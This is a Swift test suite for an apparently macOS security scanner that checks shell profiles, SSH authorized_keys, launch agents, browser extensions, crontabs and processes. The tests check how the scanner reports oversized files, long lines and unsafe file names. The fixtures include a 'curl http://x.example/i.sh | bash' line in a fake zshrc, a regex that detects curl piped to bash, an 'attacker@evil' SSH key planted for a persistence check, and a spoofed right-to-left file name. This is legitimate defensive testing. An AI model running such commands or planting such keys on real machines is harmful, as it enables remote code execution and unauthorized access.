import Foundation
import Testing
@testable import BluehatCore

struct ScanNoticeTests {
    static let publicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGd6 attacker@evil"

    let root = FileManager.default.temporaryDirectory.appending(path: "bluehat-notices-\(UUID().uuidString)")

    func rule(_ check: CheckKind, patterns: [String]? = nil) -> Rule {
        Rule(id: "\(check.rawValue).test", title: "Test", severity: .high, category: .malware, check: check, patterns: patterns, paths: nil, ports: nil, hashes: nil, setting: nil, product: nil, advisory: nil, ranges: nil, packages: nil, files: nil, teams: nil, bundles: nil, minimumVersion: nil, hosts: nil, summary: nil, remedy: nil, references: nil)
    }

    func write(_ text: String, to relativePath: String, paddedTo size: Int? = nil) throws -> String {
        let url = root.appending(path: relativePath)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        var data = Data(text.utf8)
        if let size { data.append(Data(repeating: UInt8(ascii: "\n"), count: size - data.count)) }
        try data.write(to: url)
        return url.path
    }

    func location(_ path: String) -> String {
        Finding.displayable(NSString(string: path).abbreviatingWithTildeInPath)
    }

    func launchPlist(_ arguments: [String]) throws -> String {
        let data = try PropertyListSerialization.data(fromPropertyList: ["ProgramArguments": arguments], format: .xml, options: 0)
        return String(decoding: data, as: UTF8.self)
    }

    @Test func oversizedShellProfileIsStillCheckedAndNamed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let profile = try write("curl http://x.example/i.sh | bash\n", to: "zshrc", paddedTo: Scanner.maxReadBytes + 1)
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: [#"curl.*\|\s*bash"#])], files: [profile])
        #expect(checked.findings.map(\.path) == [profile])
        #expect(checked.notices == ["Shell profile check read only the first 1 MB of \(location(profile))."])
    }

    @Test func oversizedSparseShellProfileCostsOnlyTheFirstMegabyte() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let profile = try write("echo hi\n", to: "zshrc")
        #expect(truncate(profile, 8 << 30) == 0)
        let clock = ContinuousClock()
        let elapsed = clock.measure {
            #expect(Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [profile]).notices.first == "Shell profile check read only the first 1 MB of \(location(profile)).")
        }
        #expect(elapsed < .seconds(5))
    }

    @Test func aSymlinkedShellProfileIsFollowedAndNamed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let target = try write("evil-marker\n", to: "dotfiles/zshrc", paddedTo: Scanner.maxReadBytes + 1)
        let link = root.appending(path: "zshrc").path
        try FileManager.default.createSymbolicLink(atPath: link, withDestinationPath: target)
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [link])
        #expect(checked.findings.map(\.path) == [link])
        #expect(checked.notices.first?.contains(location(link)) == true)
    }

    @Test func normalFilesGiveNoNotice() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let profile = try write("export PATH=/usr/bin\n", to: "zshrc")
        let atTheLimit = try write("export PATH=/usr/bin\n", to: "zprofile", paddedTo: Scanner.maxReadBytes)
        let keys = try write(Self.publicKey + "\n", to: "authorized_keys")
        #expect(Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [profile, atTheLimit]).notices.isEmpty)
        #expect(Scanner.sshKeyFindings([rule(.sshKey)], files: [keys]).notices.isEmpty)
    }

    @Test func missingFilesAndFifosGiveNoNoticeAndDoNotHang() throws {
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let fifo = root.appending(path: "zshrc").path
        #expect(mkfifo(fifo, 0o600) == 0)
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [fifo, root.appending(path: "missing").path])
        #expect(checked.findings.isEmpty)
        #expect(checked.notices.isEmpty)
    }

    @Test func longLineInAShellProfileIsNamed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let padding = String(repeating: "x", count: Scanner.maxMatchedLength)
        let profile = try write("\(padding) evil-marker\n", to: "zshrc")
        let exact = try write(String(repeating: "x", count: Scanner.maxMatchedLength) + "\n", to: "zprofile")
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [profile, exact])
        #expect(checked.findings.isEmpty)
        #expect(checked.notices == ["Shell profile check matched only the first 8,192 characters of very long lines in \(location(profile))."])
    }

    @Test func oversizedAuthorizedKeysStillReportsTheKeyAndNamesTheFile() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let keys = try write(Self.publicKey + "\n", to: "authorized_keys", paddedTo: Scanner.maxReadBytes + 1)
        let checked = Scanner.sshKeyFindings([rule(.sshKey)], files: [keys])
        #expect(checked.findings.map(\.path) == [keys])
        #expect(checked.notices == ["SSH key check read only the first 1 MB of \(location(keys))."])
    }

    @Test func longKeyLineIsNamed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let padded = #"environment="X=\#(String(repeating: "a", count: Scanner.maxMatchedLength))" "# + Self.publicKey
        let keys = try write(padded + "\n", to: "authorized_keys")
        let checked = Scanner.sshKeyFindings([rule(.sshKey, patterns: ["attacker@evil"])], files: [keys])
        #expect(checked.findings.isEmpty)
        #expect(checked.notices == ["SSH key check matched only the first 8,192 characters of very long lines in \(location(keys))."])
    }

    @Test func oversizedLaunchItemIsNamedAndNormalOnesStillRead() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let oversized = try write(String(repeating: " ", count: 16), to: "agents/evil.plist", paddedTo: Scanner.maxReadBytes + 1)
        let normal = try write(try launchPlist(["/usr/bin/true"]), to: "agents/normal.plist")
        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])
        #expect(read.items.map(\.path) == [normal])
        #expect(read.notice == "Launch item check skipped files too large to read: \(location(oversized)).")
    }

    @Test func normalLaunchItemsGiveNoNotice() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write(try launchPlist(["/usr/bin/true"]), to: "agents/normal.plist")
        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])
        #expect(read.notice == nil)
        #expect(Scanner.launchItemFindings([rule(.launchItem, patterns: ["evil-marker"])], items: read.items).notice == nil)
    }

    @Test func longLaunchItemCommandIsNamedAgainstItsPlist() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let padding = String(repeating: "x", count: Scanner.maxMatchedLength)
        let plist = try write(try launchPlist(["/bin/sh", "-c", "\(padding) evil-marker"]), to: "agents/evil.plist")
        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])
        let checked = Scanner.launchItemFindings([rule(.launchItem, patterns: ["evil-marker"])], items: read.items)
        #expect(checked.findings.isEmpty)
        #expect(checked.notice == "Launch item check matched only the first 8,192 characters of very long lines in \(location(plist)).")
    }

    @Test func oversizedChromiumManifestIsNamed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let id = "abcdefghijklmnopabcdefghijklmnop"
        let oversized = try write(#"{"name": "Evil"}"#, to: "Default/Extensions/\(id)/1.0_0/manifest.json", paddedTo: Scanner.maxReadBytes + 1)
        _ = try write(#"{"name": "Normal"}"#, to: "Default/Extensions/other/1.0_0/manifest.json")
        let read = Scanner.chromiumExtensions(browser: "Chrome", root: root.path)
        #expect(read.extensions.map(\.detail) == ["Chrome: Normal (other)"])
        #expect(read.oversized == [oversized])
        #expect(Scanner.oversizedFilesNotice("Browser extension check", paths: read.oversized) == "Browser extension check skipped files too large to read: \(location(oversized)).")
    }

    @Test func oversizedFirefoxIndexIsNamedAndOneAtTheLimitIsNot() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let oversized = try write(#"{"addons": []}"#, to: "evil.default/extensions.json", paddedTo: Scanner.maxExtensionIndexBytes + 1)
        _ = try write(#"{"addons": []}"#, to: "fine.default/extensions.json", paddedTo: Scanner.maxExtensionIndexBytes)
        #expect(Scanner.firefoxExtensions(profilesRoot: root.path).oversized == [oversized])
    }

    @Test func normalExtensionsNameNothing() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write(#"{"name": "Normal"}"#, to: "Default/Extensions/other/1.0_0/manifest.json")
        #expect(Scanner.chromiumExtensions(browser: "Chrome", root: root.path).oversized.isEmpty)
        #expect(Scanner.oversizedFilesNotice("Browser extension check", paths: []) == nil)
    }

    @Test func longCrontabLineIsNamed() {
        let long = String(repeating: "x", count: Scanner.maxMatchedLength) + " evil-marker"
        let checked = Scanner.crontabFindings([rule(.crontab, patterns: ["evil-marker"])], lines: [long])
        #expect(checked.findings.isEmpty)
        #expect(checked.notice == "Crontab check matched only the first 8,192 characters of very long lines in the crontab.")
        #expect(Scanner.crontabFindings([rule(.crontab, patterns: ["evil-marker"])], lines: ["* * * * * evil-marker"]).notice == nil)
    }

    @Test func longRunningProcessCommandLinesGiveNoNotice() throws {
        let marker = "bluehat-long-command-\(UUID().uuidString)"
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", "sleep 30; :", marker + String(repeating: "x", count: Scanner.maxMatchedLength)]
        try process.run()
        defer { process.terminate() }
        var notices: [String] = []
        var findings: [Finding] = []
        for _ in 0..<50 where findings.isEmpty {
            findings = Scanner.findings(in: .process, rules: [rule(.process, patterns: [marker])], projects: [], notices: &notices)
            if findings.isEmpty { usleep(100_000) }
        }
        #expect(!findings.isEmpty)
        #expect(notices.isEmpty)
    }

    @Test func manyPathsKeepTheNoticeShort() {
        let paths = (1...500).map { "/tmp/evil\(String(format: "%03d", $0)).plist" }
        let notice = Scanner.oversizedFilesNotice("Launch item check", paths: paths)
        #expect(notice == "Launch item check skipped files too large to read: /tmp/evil001.plist, /tmp/evil002.plist, /tmp/evil003.plist and 497 more.")
    }

    @Test func longNamesAreClipped() {
        let list = Scanner.pathList(["/tmp/" + String(repeating: "a", count: 1_000)])
        #expect(list.count <= Finding.maxDetailLength + 1)
    }

    @Test func attackerNamesAreMadeDisplayable() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let tricky = "evil\n\u{202E}gnp.plist"
        let path = try write("x", to: "agents/\(tricky)", paddedTo: Scanner.maxReadBytes + 1)
        let notice = try #require(Scanner.launchItemCommands(in: [root.appending(path: "agents").path]).notice)
        #expect(!notice.unicodeScalars.contains { $0.value == 0x202E || $0 == "\n" })
        #expect(notice.contains("evil gnp.plist"))
        #expect(FileManager.default.fileExists(atPath: path))
    }

    @Test func homeIsShownWithATilde() {
        #expect(Scanner.pathList([NSHomeDirectory() + "/.zshrc"]) == "~/.zshrc")
    }

    @Test func aFileReadByTwoAreasGivesOneNotice() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write("x", to: "agents/evil.plist", paddedTo: Scanner.maxReadBytes + 1)
        let directories = [root.appending(path: "agents").path]
        let notices = [Scanner.launchItemCommands(in: directories).notice, Scanner.launchItemCommands(in: directories).notice, "Another notice"].compactMap { $0 }
        #expect(notices.count == 3)
        #expect(Scanner.withoutRepeats(notices) == [notices[0], "Another notice"])
    }
}
